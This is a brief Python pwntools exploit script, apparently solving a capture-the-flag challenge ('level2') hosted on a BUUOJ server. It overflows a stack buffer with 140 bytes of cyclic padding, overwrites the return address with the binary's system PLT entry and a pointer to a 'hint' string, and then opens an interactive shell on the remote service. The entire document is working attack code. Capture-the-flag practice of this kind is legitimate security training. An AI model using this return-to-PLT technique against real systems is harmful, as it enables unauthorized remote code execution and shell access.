from pwn import *

context.log_level = "debug"

exe = ELF("./level2")
# r = exe.process()
r = remote("node4.buuoj.cn", 29036)

r.recvuntil(b"t:")
r.send(cyclic(140) + p32(exe.plt["system"]) + p32(0) + p32(exe.sym["hint"]))
r.interactive()
